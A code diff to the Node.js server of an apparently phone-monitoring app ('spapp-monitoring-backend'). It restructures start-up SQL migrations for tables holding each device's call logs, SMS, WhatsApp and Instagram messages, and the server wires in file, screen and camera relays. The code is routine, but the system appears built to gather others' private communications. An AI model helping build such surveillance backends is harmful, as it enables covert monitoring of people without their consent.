@@ -60,14 +60,15 @@ attachFileRelay(server);
 attachScreenRelay(server);
 attachCameraRelay(server);
 
-// Ensure call_logs & sms_logs have contact_name column, and whatsapp_messages table exists
+// Ensure required tables and columns exist
 const pool = require("./db/pool");
-pool
-  .query(`
-    ALTER TABLE call_logs ADD COLUMN IF NOT EXISTS contact_name VARCHAR(255);
-    ALTER TABLE sms_logs ADD COLUMN IF NOT EXISTS contact_name VARCHAR(255);
 
-    CREATE TABLE IF NOT EXISTS whatsapp_messages (
+(async function runMigrations() {
+  const migrations = [
+    `ALTER TABLE call_logs ADD COLUMN IF NOT EXISTS contact_name VARCHAR(255);`,
+    `ALTER TABLE sms_logs ADD COLUMN IF NOT EXISTS contact_name VARCHAR(255);`,
+
+    `CREATE TABLE IF NOT EXISTS whatsapp_messages (
       id              BIGSERIAL PRIMARY KEY,
       device_id       UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
       chat_name       VARCHAR(255) NOT NULL,
@@ -78,11 +79,11 @@ pool
       media_type      VARCHAR(50),
       media_path      TEXT,
       synced_at       TIMESTAMPTZ NOT NULL DEFAULT now()
-    );
-    CREATE INDEX IF NOT EXISTS idx_whatsapp_messages_device_chat ON whatsapp_messages(device_id, chat_name, message_time DESC);
-    CREATE INDEX IF NOT EXISTS idx_whatsapp_messages_device_time ON whatsapp_messages(device_id, message_time DESC);
+    );`,
+    `CREATE INDEX IF NOT EXISTS idx_whatsapp_messages_device_chat ON whatsapp_messages(device_id, chat_name, message_time DESC);`,
+    `CREATE INDEX IF NOT EXISTS idx_whatsapp_messages_device_time ON whatsapp_messages(device_id, message_time DESC);`,
 
-    CREATE TABLE IF NOT EXISTS whatsapp_chats (
+    `CREATE TABLE IF NOT EXISTS whatsapp_chats (
       id              BIGSERIAL PRIMARY KEY,
       device_id       UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
       chat_name       VARCHAR(255) NOT NULL,
@@ -91,23 +92,10 @@ pool
       last_message_at TIMESTAMPTZ DEFAULT now(),
       synced_at       TIMESTAMPTZ DEFAULT now(),
       UNIQUE (device_id, chat_name)
-    );
-    CREATE INDEX IF NOT EXISTS idx_whatsapp_chats_device ON whatsapp_chats(device_id, last_message_at DESC);
+    );`,
+    `CREATE INDEX IF NOT EXISTS idx_whatsapp_chats_device ON whatsapp_chats(device_id, last_message_at DESC);`,
 
-    DELETE FROM whatsapp_messages a USING whatsapp_messages b
-    WHERE a.id < b.id
-      AND a.device_id = b.device_id
-      AND a.chat_name = b.chat_name
-      AND a.message_text = b.message_text
-      AND a.message_time = b.message_time
-      AND a.is_outgoing = b.is_outgoing;
-
-    DELETE FROM whatsapp_messages WHERE message_text LIKE '%@s.whatsapp.net%' OR message_text LIKE '%@g.us%' OR message_text IN ('WhatsApp Contact', 'Recent WhatsApp Chat', 'Contact', 'Recent contact', 'Recent conversation', 'Tap to view conversation');
-
-    CREATE UNIQUE INDEX IF NOT EXISTS idx_whatsapp_messages_unique
-      ON whatsapp_messages(device_id, chat_name, message_text, message_time, is_outgoing);
-
-    CREATE TABLE IF NOT EXISTS instagram_messages (
+    `CREATE TABLE IF NOT EXISTS instagram_messages (
       id              BIGSERIAL PRIMARY KEY,
       device_id       UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
       chat_name       VARCHAR(255) NOT NULL,
@@ -119,14 +107,11 @@ pool
       media_path      TEXT,
       reel_url        TEXT,
       synced_at       TIMESTAMPTZ NOT NULL DEFAULT now()
-    );
-    CREATE INDEX IF NOT EXISTS idx_instagram_messages_device_chat ON instagram_messages(device_id, chat_name, message_time DESC);
-    CREATE INDEX IF NOT EXISTS idx_instagram_messages_device_time ON instagram_messages(device_id, message_time DESC);
+    );`,
+    `CREATE INDEX IF NOT EXISTS idx_instagram_messages_device_chat ON instagram_messages(device_id, chat_name, message_time DESC);`,
+    `CREATE INDEX IF NOT EXISTS idx_instagram_messages_device_time ON instagram_messages(device_id, message_time DESC);`,
 
-    CREATE UNIQUE INDEX IF NOT EXISTS idx_instagram_messages_unique
-      ON instagram_messages(device_id, chat_name, message_text, message_time, is_outgoing);
-
-    CREATE TABLE IF NOT EXISTS instagram_chats (
+    `CREATE TABLE IF NOT EXISTS instagram_chats (
       id              BIGSERIAL PRIMARY KEY,
       device_id       UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
       chat_name       VARCHAR(255) NOT NULL,
@@ -135,10 +120,20 @@ pool
       last_message_at TIMESTAMPTZ DEFAULT now(),
       synced_at       TIMESTAMPTZ DEFAULT now(),
       UNIQUE (device_id, chat_name)
-    );
-    CREATE INDEX IF NOT EXISTS idx_instagram_chats_device ON instagram_chats(device_id, last_message_at DESC);
-  `)
-  .catch((err) => console.error("Auto-migration warning:", err.message));
+    );`,
+    `CREATE INDEX IF NOT EXISTS idx_instagram_chats_device ON instagram_chats(device_id, last_message_at DESC);`,
+
+    `DELETE FROM whatsapp_messages WHERE message_text LIKE '%@s.whatsapp.net%' OR message_text LIKE '%@g.us%' OR message_text IN ('WhatsApp Contact', 'Recent WhatsApp Chat', 'Contact', 'Recent contact', 'Recent conversation', 'Tap to view conversation');`
+  ];
+
+  for (const sql of migrations) {
+    try {
+      await pool.query(sql);
+    } catch (err) {
+      console.warn("Migration step notice:", err.message);
+    }
+  }
+})();
 
 server.listen(PORT, () => {
   console.log(`spapp-monitoring-backend listening on port ${PORT} (HTTP + WS file + screen + camera relay)`);
